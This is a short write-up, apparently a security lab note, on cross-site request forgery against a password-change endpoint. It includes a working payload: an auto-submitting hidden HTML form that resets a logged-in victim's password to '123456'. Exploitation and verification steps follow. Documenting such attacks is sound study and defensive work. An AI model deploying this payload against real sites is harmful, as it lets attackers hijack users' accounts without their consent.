# Cross-Site Request Forgery (CSRF)

## Vulnerability
The web application performs state-changing actions based solely on
the user's authenticated session (cookies) and does not verify
whether the request was intentionally made by the user.

Because no CSRF token or origin validation is used, an attacker can
force a victim’s browser to send unauthorized requests.

---

## Vulnerable Scenario
A password change request is handled as follows:

```text
POST /change_password.php
password=newpassword
```
The application relies only on the session cookie for authentication.

## Attack Goal

Perform a privileged action without the victim’s knowledge
while the victim is logged in.

## CSRF Payload

The attacker hosts a malicious page containing:

```bash
<form action="http://victim.com/change_password.php" method="POST">
  <input type="hidden" name="password" value="123456">
  <input type="submit">
</form>

<script>
  document.forms[0].submit();
</script>
```

## Exploitation

1. Victim logs in to victim.com
2. Victim visits the attacker-controlled page
3. The browser automatically sends the authenticated request
4. The server processes the request as a legitimate action

## Result

```bash
Password successfully changed
```
The action is executed using the victim’s session without consent.

## Verification

After the attack:
- Victim is logged out
- Old password no longer works
- New password is active

This confirms successful CSRF exploitation.